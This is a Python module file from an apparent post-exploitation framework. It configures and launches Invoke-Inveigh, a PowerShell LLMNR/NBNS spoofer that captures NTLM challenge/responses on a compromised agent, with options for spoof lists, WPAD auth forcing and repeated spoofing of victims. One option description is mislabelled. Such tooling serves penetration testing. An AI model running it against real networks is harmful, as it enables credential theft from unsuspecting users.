from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-Inveigh',

            'Author': ['Kevin Robertson'],

            'Description': ('Inveigh is a Windows PowerShell LLMNR/NBNS spoofer designed to '
                            'assist penetration testers that find themselves limited to a '
                            'Windows system. '),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : True,

            'OpsecSafe' : True,

            'MinPSVersion' : '2',
            
            'Comments': [
                'https://github.com/Kevin-Robertson/Inveigh'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'IP' : {
                'Description'   :   'Specific local IP address for listening.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SpooferIP' : {
                'Description'   :   'Specific IP address for LLMNR/NBNS spoofing.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'LLMNR' : {
                'Description'   :   'Enable/Disable LLMNR spoofing (Y/N).',
                'Required'      :   False,
                'Value'         :   'Y'
            },
            'NBNS' : {
                'Description'   :   'Enable/Disable NBNS spoofing (Y/N).',
                'Required'      :   False,
                'Value'         :   'Y'
            },
            'NBNSTypes' : {
                'Description'   :   'Comma separated list of NBNS types to spoof.',
                'Required'      :   False,
                'Value'         :   '00,20'
            },
            'Repeat' : {
                'Description'   :   'Enable/Disable repeated LLMNR/NBNS spoofs to a victim system after one user challenge/response has been captured (Y/N).',
                'Required'      :   False,
                'Value'         :   'Y'
            },
            'SpoofList' : {
                'Description'   :   'Comma separated list of hostnames to spoof with LLMNR and NBNS.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'HTTP' : {
                'Description'   :   'Enable/Disable HTTP challenge/response capture (Y/N).',
                'Required'      :   False,
                'Value'         :   'Y'
            },
            'SMB' : {
                'Description'   :   'Enable/Disable SMB challenge/response capture (Y/N).',
                'Required'      :   False,
                'Value'         :   'Y'
            },
            'Challenge' : {
                'Description'   :   'Specific 16 character hex NTLM challenge for use with the HTTP listener. If left blank, a random challenge will be generated for each request.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'MachineAccounts' : {
                'Description'   :   'Enable/Disable showing NTLM challenge/response captures from machine accounts (Y/N).',
                'Required'      :   False,
                'Value'         :   'N'
            },
            'ForceWPADAuth' : {
                'Description'   :   'Enable/Disable LLMNR spoofing (Y/N).',
                'Required'      :   False,
                'Value'         :   'Y'
            },
            'RunTime' : {
                'Description'   :   'Run time duration in minutes.',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
        
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):
        
        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/collection/Invoke-Inveigh.ps1"

        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        # disable file output
        script += "\n" + 'Invoke-Inveigh -ConsoleOutput "Y" -Tool "2" '

        for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        script += " -" + str(option)
                    else:
                        if "," in str(values['Value']):
                            quoted = '"' + str(values['Value']).replace(',', '","') + '"'
                            script += " -" + str(option) + " " + quoted
                        else:
                            script += " -" + str(option) + " \"" + str(values['Value']) + "\""

        return script
